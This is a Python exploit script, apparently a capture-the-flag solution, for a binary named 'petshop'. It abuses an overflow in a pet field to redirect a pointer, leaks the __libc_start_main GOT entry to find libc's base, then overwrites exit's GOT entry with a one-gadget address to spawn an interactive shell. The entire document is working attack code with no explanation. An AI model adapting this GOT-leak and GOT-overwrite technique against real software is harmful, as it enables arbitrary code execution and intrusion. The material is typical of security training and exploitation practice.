from yeonnic import *
elf=ELF("./petshop")

p=process("./petshop")
target_got=0x6040a0
p.recv()

def buy_pet(choice):
    p.sendline("1")
    p.recv()
    p.sendline(str(choice))
    p.recv()

def set_pet(index,name,sound,feed):
    p.sendline("4")
    p.recv()
    p.sendline(str(index))
    p.recv()
    p.sendline(name)
    p.recv()
    p.sendline(sound)
    p.recv()
    p.sendline(feed)
    p.recv()

def leak():
    p.sendline("5")
    p.recvuntil("person:")
    result=u64(p.recv(6)+"\x00\x00")
    return result
def set_name(name):
    p.sendline("6")
    p.recv()
    p.sendline(name)
    p.recv()

exit_got=elf.got['exit']
libc_main_got=elf.got['__libc_start_main']

buy_pet(1)
set_name("test")
set_pet(1,"A","B","C"*12+p64(libc_main_got)+"\x08")
libc_main=leak()
libc_id=find_libc("__libc_start_main",libc_main)
libc_base=libc_main-get_off(libc_id[3],'__libc_start_main')
one_shot=libc_base+0xf0274
print hex(one_shot)
set_pet(1,"A","B","C"*12+p64(exit_got)+"\x08")
set_name(p64(one_shot))
p.sendline("7")


p.interactive()
